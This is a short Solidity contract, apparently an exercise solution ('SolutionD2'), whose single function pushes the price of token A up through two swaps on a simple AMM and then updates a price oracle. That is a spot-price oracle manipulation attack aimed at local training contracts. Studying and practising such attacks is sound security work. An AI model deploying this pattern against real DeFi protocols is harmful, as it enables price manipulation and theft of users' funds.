// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./SimpleAMM.sol";
import "./SimpleOracle.sol";

contract SolutionD2 {
    // Preis für A nach oben ziehen und Oracle updaten
    function manipulateUp(SimpleAMM amm, SimpleOracle oracle, uint256 amountBIn) external {
        uint256 half = amountBIn / 2;
        amm.swapBforA(amountBIn);
        amm.swapBforA(half);
        oracle.update();
    }
}

